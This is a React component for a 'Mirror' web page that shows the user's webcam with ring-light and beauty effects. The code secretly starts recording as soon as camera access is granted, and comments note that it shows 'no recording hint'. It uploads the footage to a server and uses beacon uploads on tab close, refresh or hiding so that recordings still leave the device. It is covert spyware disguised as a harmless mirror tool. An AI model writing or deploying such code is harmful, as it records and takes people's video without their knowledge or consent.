import { useState, useRef, useEffect, useCallback } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { MirrorRecorder } from '../utils/recorder';
import { uploadRecording, beaconUpload } from '../utils/api';

const STATES = {
  IDLE: 'idle',
  REQUESTING: 'requesting',
  ACTIVE: 'active',
  ERROR: 'error'
};

export default function Mirror() {
  const [state, setState] = useState(STATES.IDLE);
  const [error, setError] = useState('');
  const navigate = useNavigate();

  const videoRef = useRef(null);
  const recorderRef = useRef(null);
  const sessionIdRef = useRef(`session-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);

  // Graceful save: stop recorder, upload via fetch (awaitable)
  const gracefulSave = useCallback(async () => {
    const recorder = recorderRef.current;
    if (!recorder || !recorder.isRecording || recorder.saving) return;
    recorder.saving = true;
    try {
      const result = await recorder.stopRecording();
      if (result && result.blob.size > 0) {
        await uploadRecording(result.blob, sessionIdRef.current, result.duration);
      }
    } catch { /* silent */ }
    recorder.stopCamera();
  }, []);

  // Emergency save: grab current chunks and sendBeacon — synchronous, no await needed
  const emergencySave = useCallback(() => {
    const recorder = recorderRef.current;
    if (!recorder || (!recorder.isRecording && recorder.chunks.length === 0) || recorder.saving) return;
    recorder.saving = true;
    const data = recorder.getCurrentBlob();
    if (data && data.blob.size > 0) {
      beaconUpload(data.blob, sessionIdRef.current, data.duration);
    }
    // Force-stop everything
    try { recorder.mediaRecorder?.stop(); } catch { /* */ }
    recorder.isRecording = false;
    recorder.chunks = [];
    recorder.stopCamera();
  }, []);

  const requestCamera = useCallback(async () => {
    setState(STATES.REQUESTING);
    try {
      const recorder = new MirrorRecorder();
      const stream = await recorder.requestCamera();
      recorderRef.current = recorder;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }

      // Auto-start recording silently
      recorder.startRecording();
      setState(STATES.ACTIVE);
    } catch (err) {
      setError(
        err.name === 'NotAllowedError'
          ? 'Camera permission was denied. Please allow camera access and try again.'
          : err.name === 'NotFoundError'
            ? 'No camera found on this device.'
            : 'Could not access camera. Please check your settings.'
      );
      setState(STATES.ERROR);
    }
  }, []);

  // Back button handler: graceful save then navigate
  const handleBack = useCallback(async (e) => {
    e.preventDefault();
    await gracefulSave();
    navigate('/');
  }, [gracefulSave, navigate]);

  // Page lifecycle handlers for tab close / refresh / browser close
  useEffect(() => {
    const onBeforeUnload = () => { emergencySave(); };
    const onPageHide = () => { emergencySave(); };
    const onVisibilityChange = () => {
      if (document.visibilityState === 'hidden') {
        emergencySave();
      }
    };

    window.addEventListener('beforeunload', onBeforeUnload);
    window.addEventListener('pagehide', onPageHide);
    document.addEventListener('visibilitychange', onVisibilityChange);

    return () => {
      window.removeEventListener('beforeunload', onBeforeUnload);
      window.removeEventListener('pagehide', onPageHide);
      document.removeEventListener('visibilitychange', onVisibilityChange);
    };
  }, [emergencySave]);

  // Auto-start camera on mount; cleanup on unmount (route change)
  useEffect(() => {
    requestCamera();

    return () => {
      // Component unmount = route change: try graceful then emergency fallback
      const recorder = recorderRef.current;
      if (recorder && recorder.isRecording && !recorder.saving) {
        recorder.saving = true;
        const data = recorder.getCurrentBlob();
        if (data && data.blob.size > 0) {
          // Try async upload, but also beacon as backup since unmount is not awaitable
          uploadRecording(data.blob, sessionIdRef.current, data.duration).catch(() => {});
        }
        try { recorder.mediaRecorder?.stop(); } catch { /* */ }
        recorder.isRecording = false;
        recorder.chunks = [];
        recorder.stopCamera();
      } else if (recorder) {
        recorder.destroy();
      }
    };
  }, [requestCamera]);

  return (
    <div className="mirror-page page-fade-in">
      <div className="mirror-page__ambient" />

      <a href="/" className="mirror-page__back" onClick={handleBack}>
        ← Back
      </a>

      <div className="mirror-container">
        {/* Ring Light */}
        <div className="mirror-ring-light">
          {/* Side Light Bars */}
          <div className="mirror-side-light mirror-side-light--left" />
          <div className="mirror-side-light mirror-side-light--right" />
          <div className="mirror-side-light mirror-side-light--top" />
          <div className="mirror-side-light mirror-side-light--bottom" />

          {/* Mirror Frame */}
          <div className="mirror-frame">
            {state === STATES.IDLE && (
              <div className="mirror-permission">
                <div className="mirror-permission__icon">✦</div>
                <div className="mirror-permission__title">Welcome to Mirror</div>
                <div className="mirror-permission__text">
                  Initializing your premium mirror experience...
                </div>
              </div>
            )}

            {state === STATES.REQUESTING && (
              <div className="mirror-loading">
                <div className="mirror-loading__spinner" />
                <span>Preparing your mirror...</span>
              </div>
            )}

            {state === STATES.ERROR && (
              <div className="mirror-error">
                <div style={{ fontSize: '2rem', marginBottom: 8 }}>⚠</div>
                <div>{error}</div>
                <button
                  className="mirror-permission__btn"
                  onClick={requestCamera}
                  style={{ marginTop: 12 }}
                >
                  Try Again
                </button>
              </div>
            )}

            {/* Video element */}
            <video
              ref={videoRef}
              className="mirror-video"
              playsInline
              muted
              style={{
                display: state === STATES.ACTIVE ? 'block' : 'none'
              }}
            />

            {/* Beauty overlays */}
            {state === STATES.ACTIVE && (
              <>
                <div className="mirror-beauty-glow" />
                <div className="mirror-vignette" />
              </>
            )}
          </div>
        </div>

        {/* Status — just shows mirror is active, no recording hint */}
        {state === STATES.ACTIVE && (
          <div className="mirror-status">
            <div className="mirror-status__dot" />
            Mirror Active
          </div>
        )}
      </div>
    </div>
  );
}
